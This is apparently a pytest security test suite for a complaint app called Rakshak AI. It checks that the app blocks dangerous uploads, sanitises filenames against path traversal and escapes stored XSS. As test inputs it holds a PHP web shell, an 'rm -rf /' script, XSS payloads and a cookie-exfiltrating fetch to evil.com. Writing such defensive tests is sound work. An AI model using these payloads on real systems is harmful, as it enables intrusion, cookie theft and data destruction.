"""
test_security_hardening.py — Security hardening tests for Rakshak AI.

Coverage
--------
FILE UPLOAD — both POST /complaints (session-token) and POST /complaints/firebase:
  1.  Blocked extension (.php) → 400
  2.  Blocked extension (.exe) → 400
  3.  Blocked extension (.sh)  → 400
  4.  Blocked extension (.html)→ 400
  5.  Blocked extension (.py)  → 400
  6.  Blocked extension (.apk) → 400 (was formerly allowed)
  7.  Blocked extension (.zip) → 400 (was formerly allowed)
  8.  Blocked MIME type (text/html) → 400
  9.  File exceeding 5 MB limit → 400
  10. Valid PNG upload         → 200
  11. Valid PDF upload         → 200
  12. Valid JPEG upload        → 200
  13. Valid TXT upload         → 200
  14. Filename with path traversal (../../evil.png) → safe stored name, no traversal

STORED XSS MITIGATION — sanitize_text unit tests + end-to-end DB check:
  15. <script>alert(1)</script> is escaped in returned/stored data
  16. <img src=x onerror=alert(1)> is escaped
  17. javascript: URI in complaint text is harmless after sanitization
  18. Plain text without HTML is preserved after sanitization (no over-escaping)
  19. SQL injection pattern (UNION SELECT) survives as literal text (no crash)
  20. XSS payload stored via /complaints/firebase is escaped in DB row

UNIT TESTS — security_utils module directly:
  21. validate_file_upload: empty filename → False
  22. validate_file_upload: oversized file → False
  23. validate_file_upload: blocked MIME  → False
  24. validate_file_upload: allowed .png  → True
  25. generate_safe_filename: does NOT contain original filename characters
  26. generate_safe_filename: output is path-safe (no / or ..)

Strategy
--------
- File upload tests for both endpoints share a common helper.
- Firebase endpoint tests patch firebase_admin.auth.verify_id_token (no GCP calls).
- Session-token endpoint tests use the real login flow against the shared tmp DB
  (same pattern as the rest of the test suite).
- XSS DB check reads the SQLite row directly — no reliance on response shaping.
"""

import io
import os
import sys
import uuid
import sqlite3
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient

os.environ.setdefault("RAKSHAK_TESTING", "1")

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import main  # noqa: E402
import firebase_admin.auth as _fb_auth  # noqa: E402
from security_utils import (  # noqa: E402
    sanitize_text,
    validate_file_upload,
    generate_safe_filename,
    MAX_FILE_SIZE_BYTES,
    SAFE_EXTENSIONS,
    BLOCKED_EXTENSIONS,
)

client = TestClient(main.app, raise_server_exceptions=False)

# ---------------------------------------------------------------------------
# Auth helpers
# ---------------------------------------------------------------------------
_TOKEN_CACHE: dict = {}


def _session_token() -> str:
    """Log in once as a regular user; cache the token."""
    if "user" not in _TOKEN_CACHE:
        email = f"sec_{uuid.uuid4().hex[:8]}@test.com"
        client.post("/register", json={
            "full_name": "Security Test User",
            "email": email,
            "password": "SecurePass999",
            "role": "user",
        })
        res = client.post("/login", json={"email": email, "password": "SecurePass999"})
        assert res.status_code == 200
        _TOKEN_CACHE["user"] = res.json()["token"]
        _TOKEN_CACHE["user_id"] = res.json()["user"]["id"]
    return _TOKEN_CACHE["user"]


def _session_uid() -> str:
    _session_token()
    return _TOKEN_CACHE["user_id"]


def _auth(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


_FIREBASE_DECODED = {
    "uid": f"sec-fb-uid-{uuid.uuid4().hex[:8]}",
    "email": "security@fbtest.example.com",
}


def _bearer() -> dict:
    return {"Authorization": "Bearer valid.firebase.token"}


# ---------------------------------------------------------------------------
# File helpers
# ---------------------------------------------------------------------------
_TINY_PNG = (
    b"\x89PNG\r\n\x1a\n"          # PNG signature
    b"\x00\x00\x00\rIHDR"         # IHDR chunk length + type
    b"\x00\x00\x00\x01"           # width=1
    b"\x00\x00\x00\x01"           # height=1
    b"\x08\x02\x00\x00\x00"       # 8-bit RGB
    b"\x90wS\xde"                  # CRC
    b"\x00\x00\x00\x0cIDATx\x9c"  # IDAT
    b"c\xf8\x0f\x00\x00\x01\x01\x00\x05\x18\xd8N"
    b"\x00\x00\x00\x00IEND\xaeB`\x82"  # IEND
)
_TINY_JPEG = b"\xff\xd8\xff\xe0\x00\x10JFIF"
_TINY_WEBP = b"RIFF0000WEBP"

_MINIMAL_PDF = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF"
_PLAIN_TEXT  = b"This is a plain text evidence note."


def _make_file(content: bytes, filename: str, mime: str):
    """Return a tuple for TestClient multipart upload."""
    return (filename, io.BytesIO(content), mime)


def _base_data(user_id: str | None = None) -> dict:
    """Minimal form payload for POST /complaints."""
    return {
        "user_id":        user_id or _session_uid(),
        "user_name":      "Security Test User",
        "category":       "Serving Personnel",
        "complaint_text": "Security test complaint.",
        "suspicious_url": "",
    }


def _fb_base_data() -> dict:
    """Minimal form payload for POST /complaints/firebase (no user_id)."""
    return {
        "category":       "Serving Personnel",
        "complaint_text": "Security test complaint.",
        "suspicious_url": "",
    }


# ===========================================================================
# 1-9  FILE UPLOAD — BLOCKED TYPES AND OVERSIZED FILES
# ===========================================================================

class TestBlockedFileUploads:
    """Files that must be rejected with HTTP 400 on both endpoints."""

    # ── Helper ──────────────────────────────────────────────────────────────
    def _post_session(self, filename: str, content: bytes, mime: str):
        return client.post(
            "/complaints",
            data=_base_data(),
            files={"evidence": _make_file(content, filename, mime)},
            headers=_auth(_session_token()),
        )

    def _post_firebase(self, filename: str, content: bytes, mime: str):
        with patch("firebase_admin.auth.verify_id_token", return_value=_FIREBASE_DECODED):
            return client.post(
                "/complaints/firebase",
                data=_fb_base_data(),
                files={"evidence": _make_file(content, filename, mime)},
                headers=_bearer(),
            )

    # ── .php ────────────────────────────────────────────────────────────────
    def test_php_blocked_session(self):
        res = self._post_session("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php")
        assert res.status_code == 400, res.text

    def test_php_blocked_firebase(self):
        res = self._post_firebase("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php")
        assert res.status_code == 400, res.text

    # ── .exe ────────────────────────────────────────────────────────────────
    def test_exe_blocked_session(self):
        res = self._post_session("malware.exe", b"MZ\x90\x00", "application/octet-stream")
        assert res.status_code == 400

    def test_exe_blocked_firebase(self):
        res = self._post_firebase("malware.exe", b"MZ\x90\x00", "application/octet-stream")
        assert res.status_code == 400

    # ── .sh ─────────────────────────────────────────────────────────────────
    def test_sh_blocked_session(self):
        res = self._post_session("backdoor.sh", b"#!/bin/bash\nrm -rf /", "text/x-sh")
        assert res.status_code == 400

    def test_sh_blocked_firebase(self):
        res = self._post_firebase("backdoor.sh", b"#!/bin/bash\nrm -rf /", "text/x-sh")
        assert res.status_code == 400

    # ── .html ────────────────────────────────────────────────────────────────
    def test_html_blocked_session(self):
        res = self._post_session("xss.html", b"<script>alert(1)</script>", "text/html")
        assert res.status_code == 400

    def test_html_blocked_firebase(self):
        res = self._post_firebase("xss.html", b"<script>alert(1)</script>", "text/html")
        assert res.status_code == 400

    # ── .py ─────────────────────────────────────────────────────────────────
    def test_py_blocked_session(self):
        res = self._post_session("exploit.py", b"import os; os.system('id')", "text/x-python")
        assert res.status_code == 400

    def test_py_blocked_firebase(self):
        res = self._post_firebase("exploit.py", b"import os; os.system('id')", "text/x-python")
        assert res.status_code == 400

    # ── .apk (formerly allowed, now blocked) ────────────────────────────────
    def test_apk_blocked_session(self):
        res = self._post_session("trojan.apk", b"PK\x03\x04", "application/vnd.android.package-archive")
        assert res.status_code == 400

    def test_apk_blocked_firebase(self):
        res = self._post_firebase("trojan.apk", b"PK\x03\x04", "application/vnd.android.package-archive")
        assert res.status_code == 400

    # ── .zip (formerly allowed, now blocked) ────────────────────────────────
    def test_zip_blocked_session(self):
        res = self._post_session("payload.zip", b"PK\x03\x04", "application/zip")
        assert res.status_code == 400

    def test_zip_blocked_firebase(self):
        res = self._post_firebase("payload.zip", b"PK\x03\x04", "application/zip")
        assert res.status_code == 400

    # ── Blocked MIME type even with an allowed extension ─────────────────────
    def test_html_mime_with_png_ext_blocked_session(self):
        res = self._post_session("innocent.png", b"<html>", "text/html")
        assert res.status_code == 400

    def test_html_mime_with_png_ext_blocked_firebase(self):
        res = self._post_firebase("innocent.png", b"<html>", "text/html")
        assert res.status_code == 400

    # ── File exceeding 5 MB size limit ───────────────────────────────────────
    def test_oversized_file_blocked_session(self):
        big = b"A" * (MAX_FILE_SIZE_BYTES + 1)
        res = self._post_session("big.png", big, "image/png")
        assert res.status_code == 400

    def test_oversized_file_blocked_firebase(self):
        big = b"A" * (MAX_FILE_SIZE_BYTES + 1)
        res = self._post_firebase("big.png", big, "image/png")
        assert res.status_code == 400

    # ── Error message is user-safe (no internal paths) ───────────────────────
    def test_error_message_no_internal_path(self):
        res = self._post_firebase("shell.php", b"<?php ?>", "application/x-php")
        detail = res.json().get("detail", "")
        assert "/home" not in detail
        assert "UPLOAD_DIR" not in detail
        assert "\\" not in detail


# ===========================================================================
# 10-13  FILE UPLOAD — ALLOWED TYPES SUCCEED
# ===========================================================================

class TestAllowedFileUploads:
    """Valid file types must succeed on both endpoints."""

    def _post_firebase(self, filename: str, content: bytes, mime: str):
        with patch("firebase_admin.auth.verify_id_token", return_value=_FIREBASE_DECODED):
            return client.post(
                "/complaints/firebase",
                data=_fb_base_data(),
                files={"evidence": _make_file(content, filename, mime)},
                headers=_bearer(),
            )

    def test_png_allowed(self):
        res = self._post_firebase("screenshot.png", _TINY_PNG, "image/png")
        assert res.status_code == 200, res.text
        assert res.json()["success"] is True

    def test_jpeg_allowed(self):
        res = self._post_firebase("photo.jpeg", _TINY_JPEG, "image/jpeg")
        assert res.status_code == 200, res.text

    def test_webp_allowed(self):
        # webp has no blocked MIME — image/webp is in SAFE_MIME_TYPES
        res = self._post_firebase("img.webp", _TINY_WEBP, "image/webp")
        assert res.status_code == 200, res.text

    def test_pdf_allowed(self):
        res = self._post_firebase("document.pdf", _MINIMAL_PDF, "application/pdf")
        assert res.status_code == 200, res.text

    def test_txt_allowed(self):
        res = self._post_firebase("note.txt", _PLAIN_TEXT, "text/plain")
        assert res.status_code == 200, res.text


# ===========================================================================
# 14  FILENAME SAFETY — PATH TRAVERSAL
# ===========================================================================

class TestFilenameSafety:
    """Path traversal filenames must not escape UPLOAD_DIR."""

    def test_path_traversal_filename_safe(self):
        """
        A filename like '../../etc/passwd.png' must be stored only inside
        UPLOAD_DIR. The safe_name generated by generate_safe_filename must not
        contain '..' sequences and the resolved path must stay inside UPLOAD_DIR.
        """
        traversal_name = "../../etc/passwd.png"
        with patch("firebase_admin.auth.verify_id_token", return_value=_FIREBASE_DECODED):
            res = client.post(
                "/complaints/firebase",
                data=_fb_base_data(),
                files={"evidence": _make_file(_TINY_PNG, traversal_name, "image/png")},
                headers=_bearer(),
            )
        # Must succeed (the name is sanitized, not rejected)
        assert res.status_code == 200, res.text

    def test_generate_safe_filename_no_traversal(self):
        safe = generate_safe_filename("../../etc/passwd.png", prefix="RK-TEST")
        assert ".." not in safe
        assert "/" not in safe
        assert "\\" not in safe

    def test_generate_safe_filename_no_original_path(self):
        """
        The original path components (directory names, base filename) must not
        appear in the generated name.  The extension IS retained because
        validate_file_upload already rejects dangerous extensions before this
        function is ever called — stripping it here would be redundant and would
        break Content-Type serving for legitimate files.
        """
        safe = generate_safe_filename("/home/attacker/evil payload file.pdf", prefix="X")
        assert "attacker" not in safe
        assert "evil" not in safe
        assert "payload" not in safe
        # The safe extension of the original file IS present (pdf is allowed)
        assert safe.endswith(".pdf")


# ===========================================================================
# 15-19  STORED XSS MITIGATION — sanitize_text unit tests
# ===========================================================================

class TestSanitizeTextUnit:
    """Direct unit tests of security_utils.sanitize_text."""

    def test_script_tag_escaped(self):
        raw = "<script>alert(1)</script>"
        result = sanitize_text(raw)
        # Must NOT contain a literal < or > — they become &lt; / &gt;
        assert "<script>" not in result
        assert "</script>" not in result
        # HTML entities present
        assert "&lt;" in result or "script" not in result

    def test_img_onerror_escaped(self):
        raw = '<img src=x onerror=alert(1)>'
        result = sanitize_text(raw)
        assert "<img" not in result
        assert "onerror" not in result or "&lt;" in result

    def test_javascript_uri_escaped(self):
        raw = "Click here: javascript:alert(document.cookie)"
        result = sanitize_text(raw)
        # Raw < > are escaped; plain text content may survive but can't execute
        assert "<" not in result
        assert ">" not in result

    def test_plain_text_preserved(self):
        raw = "I received a suspicious SMS asking for my bank OTP."
        result = sanitize_text(raw)
        # Core content survives — no over-escaping of plain ASCII
        assert "suspicious SMS" in result
        assert "OTP" in result

    def test_ampersand_in_url_survives(self):
        """Ampersands in URLs should be escaped but the URL remains recognisable."""
        raw = "Visit http://example.com/page?a=1&b=2 for details"
        result = sanitize_text(raw)
        assert "example.com" in result
        # Ampersand is escaped as &amp; — still safe in DB
        assert "&amp;" in result or "b=2" in result

    def test_null_byte_stripped(self):
        raw = "normal text\x00with null"
        result = sanitize_text(raw)
        assert "\x00" not in result
        assert "normal text" in result

    def test_truncation(self):
        raw = "A" * 6000
        result = sanitize_text(raw, max_length=5000)
        assert len(result) <= 5000

    def test_empty_string_returns_empty(self):
        assert sanitize_text("") == ""
        assert sanitize_text(None) == ""  # type: ignore[arg-type]


# ===========================================================================
# 20  STORED XSS — END-TO-END DB CHECK via /complaints/firebase
# ===========================================================================

class TestStoredXssEndToEnd:
    """Verify that XSS payloads are sanitized before hitting the database."""

    def _submit(self, complaint_text: str) -> str:
        """Submit a complaint and return its complaint_id."""
        uid = f"xss-uid-{uuid.uuid4().hex[:8]}"
        decoded = {"uid": uid, "email": f"{uid}@example.com"}
        with patch("firebase_admin.auth.verify_id_token", return_value=decoded):
            res = client.post(
                "/complaints/firebase",
                data={
                    "category": "Serving Personnel",
                    "complaint_text": complaint_text,
                    "suspicious_url": "",
                },
                headers=_bearer(),
            )
        assert res.status_code == 200, res.text
        return res.json()["complaint_id"]

    def _read_complaint_text(self, complaint_id: str) -> str:
        conn = sqlite3.connect(main.DB_NAME)
        row = conn.execute(
            "SELECT complaint_text FROM complaints WHERE id = ?", (complaint_id,)
        ).fetchone()
        conn.close()
        assert row is not None
        return row[0]

    def test_script_tag_not_stored_raw(self):
        payload = "<script>alert(document.cookie)</script>"
        cid = self._submit(payload)
        stored = self._read_complaint_text(cid)
        # Raw angle brackets must not appear — they must be HTML-escaped
        assert "<script>" not in stored
        assert "</script>" not in stored

    def test_script_tag_stored_as_entities(self):
        payload = "<script>alert(1)</script>"
        cid = self._submit(payload)
        stored = self._read_complaint_text(cid)
        # html.escape produces &lt; / &gt;
        assert "&lt;script&gt;" in stored or "script" not in stored

    def test_img_onerror_not_stored_raw(self):
        payload = '<img src="x" onerror="fetch(\'https://evil.com/?\'+document.cookie)">'
        cid = self._submit(payload)
        stored = self._read_complaint_text(cid)
        assert "<img" not in stored
        assert "onerror" not in stored or "&lt;" in stored

    def test_legitimate_text_stored_intact(self):
        payload = "I received a phishing SMS from +91 9876543210 about my salary account."
        cid = self._submit(payload)
        stored = self._read_complaint_text(cid)
        assert "phishing SMS" in stored
        assert "9876543210" in stored


# ===========================================================================
# 21-26  UNIT TESTS — validate_file_upload & generate_safe_filename
# ===========================================================================

class TestValidateFileUploadUnit:
    def test_empty_filename_rejected(self):
        ok, msg = validate_file_upload("", "image/png", 100)
        assert ok is False
        assert msg

    def test_oversized_rejected(self):
        ok, msg = validate_file_upload("img.png", "image/png", MAX_FILE_SIZE_BYTES + 1)
        assert ok is False
        assert "large" in msg.lower() or "MB" in msg

    def test_blocked_mime_rejected(self):
        ok, msg = validate_file_upload("doc.png", "text/html", 100)
        assert ok is False

    def test_blocked_extension_rejected(self):
        for ext in (".php", ".exe", ".sh", ".py", ".html", ".apk", ".zip"):
            ok, msg = validate_file_upload(f"file{ext}", "image/png", 100)
            assert ok is False, f"Expected {ext} to be rejected"

    def test_blocked_intermediate_extensions_rejected(self):
        for filename in ("payload.php.jpg", "archive.exe.pdf", "script.sh.txt"):
            ok, msg = validate_file_upload(filename, "image/jpeg", 100)
            assert ok is False, f"Expected compound filename to be rejected: {filename}"
            assert "blocked" in msg.lower()

    def test_spoofed_binary_magic_bytes_rejected(self):
        spoofed_files = (
            ("image.png", "image/png", b"not a png"),
            ("image.jpg", "image/jpeg", b"not a jpeg"),
            ("image.webp", "image/webp", b"RIFF0000NOPE"),
            ("document.pdf", "application/pdf", b"not a pdf"),
        )
        for filename, content_type, content in spoofed_files:
            ok, msg = validate_file_upload(
                filename, content_type, len(content), content
            )
            assert ok is False, f"Expected spoofed content to be rejected: {filename}"
            assert "signature" in msg.lower()

    def test_valid_binary_magic_bytes_accepted(self):
        valid_files = (
            ("image.png", "image/png", b"\x89PNG\r\n\x1a\n"),
            ("image.jpg", "image/jpeg", b"\xff\xd8\xff"),
            ("image.webp", "image/webp", b"RIFF0000WEBP"),
            ("document.pdf", "application/pdf", b"%PDF-1.7"),
        )
        for filename, content_type, content in valid_files:
            ok, msg = validate_file_upload(
                filename, content_type, len(content), content
            )
            assert ok is True, f"Expected valid content to be accepted: {filename}: {msg}"

    def test_text_binary_and_script_headers_rejected(self):
        for content in (b"safe\x00text", b"MZ\x90\x00", b"<?php echo 1;"):
            ok, msg = validate_file_upload("note.txt", "text/plain", len(content), content)
            assert ok is False
            assert "content" in msg.lower()

    def test_allowed_png_accepted(self):
        ok, msg = validate_file_upload("screenshot.png", "image/png", 1024)
        assert ok is True, msg

    def test_allowed_pdf_accepted(self):
        ok, msg = validate_file_upload("document.pdf", "application/pdf", 1024)
        assert ok is True, msg

    def test_allowed_txt_accepted(self):
        ok, msg = validate_file_upload("note.txt", "text/plain", 512)
        assert ok is True, msg

    def test_no_mime_allowed_for_safe_ext(self):
        """Missing MIME type (empty string) should not block a safe extension."""
        ok, msg = validate_file_upload("image.jpg", "", 1024)
        assert ok is True, msg


class TestGenerateSafeFilenameUnit:
    def test_no_double_dot(self):
        for name in ("../../etc/passwd", "../secret.txt", "foo/../../bar"):
            safe = generate_safe_filename(name)
            assert ".." not in safe, f".. found in safe name for input: {name!r}"

    def test_no_slash(self):
        for name in ("/etc/passwd.png", "sub/dir/file.pdf", "C:\\Windows\\evil.txt"):
            safe = generate_safe_filename(name)
            assert "/" not in safe
            assert "\\" not in safe

    def test_extension_preserved(self):
        safe = generate_safe_filename("photo.png", prefix="RK")
        assert safe.endswith(".png")

    def test_original_name_not_in_output(self):
        safe = generate_safe_filename("very_secret_internal_name.pdf", prefix="X")
        assert "very_secret_internal_name" not in safe

    def test_prefix_included(self):
        safe = generate_safe_filename("file.png", prefix="RK-20260101")
        assert safe.startswith("RK-20260101")
